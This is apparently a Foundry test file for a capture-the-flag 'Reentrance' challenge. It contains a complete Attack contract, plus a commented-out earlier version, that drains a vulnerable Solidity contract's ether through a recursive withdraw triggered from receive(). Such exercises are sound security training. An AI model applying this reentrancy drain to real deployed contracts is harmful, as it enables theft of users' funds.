// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
import "src/Reentrance.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";


contract ReentranceTest is Test {
    Reentrance private reentrance;
    Attack private attack;
    address private constant HACKER = address(0x1);
    address private constant ALICE = address(0x2);

    function setUp() external {
        vm.deal(ALICE, 5e18);
        vm.deal(HACKER, 6e18);
        reentrance = new Reentrance();
        attack = new Attack(address(reentrance));
    }

    function testHack() external {
        vm.prank(ALICE);
        reentrance.donate.value(5e18)(ALICE);

        vm.startPrank(HACKER);
        attack.attack.value(1e18)();
        // vm.stopPrank();
        console.log(address(reentrance).balance);
    }
}

// contract Attack {
//     Reentrance public reentrance;

//     constructor(address _reentranceAddress) {
//         reentrance = Reentrance(payable(_reentranceAddress));
//     }

//     receive() external payable {
//         if (address(reentrance).balance >= 1 ether) {
//             reentrance.withdraw(1e18);
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether);
//         reentrance.donate{value: msg.value}(address(this));
//         reentrance.withdraw(msg.value);
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }


interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}


contract Attack {
    IReentrance public challenge;
    uint256 initialDeposit;

    constructor(address challengeAddress) {
        challenge = IReentrance(challengeAddress);
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        // first deposit some funds
        initialDeposit = msg.value;
        challenge.donate.value(initialDeposit)(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(challenge).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialDeposit < challengeTotalRemainingBalance
                    ? initialDeposit
                    : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}